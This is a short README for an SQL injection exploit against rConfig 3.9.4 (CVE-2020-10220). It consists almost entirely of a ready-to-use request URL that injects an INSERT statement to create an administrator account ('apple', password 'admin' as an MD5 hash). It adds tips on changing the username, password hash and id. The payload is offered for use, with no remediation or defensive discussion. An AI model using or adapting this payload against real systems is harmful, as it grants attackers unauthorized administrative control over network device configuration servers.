# rConfig-3.9.4-SQL-injection-for-creating-admin

## CVE-2020-10220 

The following URL adds a user "apple" with password "admin" to the rConfig service. After running this, you can then login with the credentials apple:admin
```
https://192.168.95.57:8081/commands.inc.php?searchOption=contains&searchField=vuln&search=search&searchColumn=command ;INSERT INTO `users` (`id`, `username`, `password`, `userid`, `userlevel`, `email`, `timestamp`, `status`) VALUES ('450', 'apple', '21232f297a57a5a743894a0e4a801fc3', '6c97424dc92f14ae78f8cc13cd08308d', 9, 'apple@domain.com', 1346920339, 1);--
```
#### Things that can be changed:
* Obviously the username can be change. 
* The password field can be changed too. Just replace it with the corresponding md5 hash.
* For changing the id field, better keep it small (like between 200 and 900).
